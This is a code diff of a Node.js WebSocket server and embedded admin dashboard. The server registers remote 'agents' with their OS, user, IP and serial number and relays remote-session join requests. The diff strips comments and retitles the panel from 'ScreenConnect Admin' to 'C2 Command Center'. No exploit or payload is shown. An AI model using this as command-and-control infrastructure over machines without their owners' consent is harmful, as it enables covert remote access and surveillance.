@@ -32,7 +32,6 @@ try {
  console.error('[DB] Turso client creation failed:', error.message);
 }
 
-// Ensure schema exists and mark ready
 async function ensureSchema() {
  try {
  await dbClient.execute(`
@@ -66,7 +65,6 @@ async function ensureSchema() {
  }
 }
 
-// Call this immediately when the module loads
 ensureSchema().catch(err => console.error('[DB] Initial schema check failed:', err));
 
 function query(sql, params = []) {
@@ -183,7 +181,6 @@ wss.on('connection', (ws, req) => {
  notifyAdmin(clientId, '🛡️ Admin Session Started');
  sendMessage(ws, { type: 'registered', id: clientId });
  
- // Send all users from DB to the new admin
  const allUsers = await queryRows('SELECT * FROM users');
  const usersList = allUsers.map(u => ({
  id: u.id,
@@ -196,7 +193,6 @@ wss.on('connection', (ws, req) => {
  serial_number: u.serial_number
  }));
  sendMessage(ws, { type: 'init_users', users: usersList });
- 
  return;
  }
 
@@ -204,7 +200,6 @@ wss.on('connection', (ws, req) => {
  if (data.type === 'info') {
  if (ws.isAdmin) return;
 
- // Accept BOTH 'id' and 'uniqueId' as the persistent identifier
  const uniqueId = String(data.uniqueId || data.id || '').trim();
  if (!uniqueId || uniqueId.length > 255) {
  logDB('[WARN] Invalid agent unique ID');
@@ -214,19 +209,16 @@ wss.on('connection', (ws, req) => {
  ws.uniqueId = uniqueId;
  const now = Date.now();
 
- // Check if this agent already exists in DB
  if (dbClient) {
  const existingUser = await queryOne('SELECT * FROM users WHERE id = ?', [uniqueId]);
 
  if (!existingUser) {
- // NEW AGENT — insert
  await dbClient.execute(`
  INSERT INTO users (id, os, arch, user, ip, last_seen, status, serial_number)
  VALUES (?, ?, ?, ?, ?, ?, 'Online', ?)
  `, [uniqueId, data.os || null, data.arch || null, data.user || null, data.ip || remoteAddress, now, data.serialNumber || uniqueId]);
  logDB(`[AGENT] NEW: ${uniqueId} (${data.os || 'unknown'})`);
  } else {
- // EXISTING AGENT — update
  await dbClient.execute(`
  UPDATE users SET
  last_seen = ?,
@@ -243,7 +235,6 @@ wss.on('connection', (ws, req) => {
  logDB(`[AGENT] NO DB: ${uniqueId} (${data.os || 'unknown'})`);
  }
 
- // Notify all admins
  for (const client of wss.clients) {
  if (client.readyState === WebSocket.OPEN && client.isAdmin) {
  sendMessage(client, {
@@ -284,7 +275,6 @@ wss.on('connection', (ws, req) => {
  if (ws.isAdmin) {
  const targetWs = findAgentByUniqueID(String(data.targetId));
  if (targetWs && targetWs.readyState === WebSocket.OPEN) {
- // Send the join request to the specific agent
  sendMessage(targetWs, { type: 'request_join', targetId: data.targetId, from: 'admin' });
  logDB(`[ADMIN] Requested join to ${data.targetId}`);
  } else {
@@ -350,10 +340,8 @@ module.exports = async (req, res) => {
  // Handle WebSocket Upgrade
  const upgradeHeader = req.headers['upgrade'] || '';
  if (upgradeHeader.toLowerCase() === 'websocket') {
- // Parse the URL
  const url = new URL(req.url, `http://${req.headers.host}`);
  
- // Create a dummy response object for the WebSocket server
  const dummyRes = {
  writeHead: (status, headers) => {
  res.writeHead(status, headers);
@@ -363,12 +351,10 @@ module.exports = async (req, res) => {
  }
  };
 
- // Handle the upgrade
  wss.handleUpgrade(req, req.socket, Buffer.from(''), (socket) => {
  wss.emit('connection', socket, req);
  });
 
- // Prevent the default response from being sent
  return;
  }
 
@@ -424,35 +410,27 @@ const adminHTML = `
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ScreenConnect Admin</title>
-    <!-- Google Fonts -->
+    <title>C2 Command Center</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <!-- FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
-        /* --- CSS Variables for Premium Theme --- */
         :root {
-            --bg-base: #080b12;         /* Deepest background */
-            --bg-surface: #0f1523;      /* Panel background */
-            --bg-surface-hover: #182033;/* Hover states */
+            --bg-base: #080b12;
+            --bg-surface: #0f1523;
+            --bg-surface-hover: #182033;
             --bg-glass: rgba(15, 21, 35, 0.7);
-            --text-main: #e2e8f0;       /* Primary text */
-            --text-muted: #64748b;      /* Secondary text */
-            --accent: #0ea5e9;          /* Sky blue accent */
+            --text-main: #e2e8f0;
+            --text-muted: #64748b;
+            --accent: #0ea5e9;
             --accent-glow: rgba(14, 165, 233, 0.4);
-            --success: #10b981;         /* Green */
+            --success: #10b981;
             --success-glow: rgba(16, 185, 129, 0.3);
-            --border: #1e293b;          /* Subtle borders */
+            --border: #1e293b;
             --border-light: rgba(255, 255, 255, 0.05);
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
 
         body {
             background-color: var(--bg-base);
@@ -465,7 +443,6 @@ const adminHTML = `
                 radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.03), transparent 25%);
         }
 
-        /* --- Sidebar --- */
         .sidebar {
             width: 260px;
             background-color: var(--bg-glass);
@@ -564,7 +541,6 @@ const adminHTML = `
             box-shadow: 0 6px 16px var(--accent-glow);
         }
 
-        /* --- Main Content --- */
         .main-content {
             flex: 1;
             display: flex;
@@ -573,7 +549,6 @@ const adminHTML = `
             position: relative;
         }
 
-        /* Header */
         .top-header {
             height: 72px;
             display: flex;
@@ -632,7 +607,6 @@ const adminHTML = `
             color: var(--text-main);
         }
 
-        /* Content Area */
         .content-body {
             padding: 32px;
             overflow-y: auto;
@@ -646,7 +620,6 @@ const adminHTML = `
             letter-spacing: -0.5px;
         }
 
-        /* Stats Cards */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
@@ -695,7 +668,6 @@ const adminHTML = `
         .stat-card .value.online { color: var(--success); text-shadow: 0 0 12px var(--success-glow); }
         .stat-card .value.accent { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }
 
-        /* Data Table */
         .data-panel {
             background-color: var(--bg-surface);
             border: 1px solid var(--border-light);
@@ -745,7 +717,6 @@ const adminHTML = `
             border-bottom: none;
         }
 
-        /* Custom Checkbox (Styled for visibility) */
         .custom-checkbox {
             width: 20px;
             height: 20px;
@@ -761,7 +732,6 @@ const adminHTML = `
             border-color: var(--accent);
         }
 
-        /* Machine Info */
         .machine-info {
             display: flex;
             flex-direction: column;
@@ -786,7 +756,6 @@ const adminHTML = `
             color: var(--text-muted);
         }
 
-        /* Status Badge */
         .status {
             display: flex;
             align-items: center;
@@ -810,7 +779,6 @@ const adminHTML = `
             background-color: var(--text-muted);
         }
 
-        /* --- REMOTE SESSION MODAL (The "ScreenConnect" Video View) */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
@@ -848,7 +816,6 @@ const adminHTML = `
             transform: scale(1);
         }
 
-        /* Session Toolbar */
         .session-toolbar {
             height: 50px;
             background: #0f1523;
@@ -918,7 +885,6 @@ const adminHTML = `
             background: rgba(239, 68, 68, 0.2);
         }
 
-        /* The actual "Video" Screen */
         .video-screen {
             flex: 1;
             background: #020617;
@@ -927,7 +893,6 @@ const adminHTML = `
             align-items: center;
             position: relative;
             overflow: hidden;
-            /* Simulated desktop background */
             background-image:
                 radial-gradient(circle at center, #1e293b 0%, #020617 100%);
         }
@@ -958,7 +923,6 @@ const adminHTML = `
             font-size: 0.9rem;
         }
 
-        /* Scrollbar */
         ::-webkit-scrollbar { width: 8px; }
         ::-webkit-scrollbar-track { background: var(--bg-base); }
         ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
@@ -1109,7 +1073,6 @@ const adminHTML = `
                     ws.isAdmin = true;
                 }
                 else if (data.type === 'init_users') {
-                    // Initialize users from DB on admin connect
                     users = {};
                     data.users.forEach(user => {
                         users[user.id] = {
@@ -1315,7 +1278,6 @@ const adminHTML = `
             document.getElementById('connectingState').style.display = 'block';
             document.getElementById('sessionModal').classList.add('active');
             
-            // Request join
             ws.send(JSON.stringify({
                 type: 'request_join',
                 targetId: machineId,
@@ -1324,7 +1286,6 @@ const adminHTML = `
         }
 
         function openNewSession() {
-            // Placeholder for new session creation
             alert("New Session functionality would go here.");
         }
 
